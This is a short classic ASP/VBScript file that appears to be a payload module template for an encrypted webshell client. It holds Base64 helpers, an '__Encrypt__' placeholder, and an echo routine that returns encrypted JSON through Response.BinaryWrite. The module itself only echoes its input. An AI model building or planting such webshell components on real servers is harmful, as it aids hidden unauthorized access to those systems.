Dim status,message
status="success"

__Encrypt__

Function Base64Encode(sText)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function
Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function
Function GetErr(Err)
	If Err Then
		GetErr= "<font size=2><li>Error:"&Err.Description&"</li><li>ErrorSource:"&Err.Source&"</li><br>"
	End If
End Function
Function GetStream()
	Set GetStream=CreateObject("Adodb.Stream")
End Function
Function GetFso()
	Dim Fso,Key
	Key="Scripting.FileSystemObject"
	Set Fso=server.CreateObject(Key)
	Set GetFso=Fso
End Function
Sub echo(content)
on error resume Next
finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(content)&"""}"
Response.binarywrite(Encrypt(finalResult))
End Sub

Sub main(arrArgs)
content=arrArgs(0)
echo(content)
End Sub
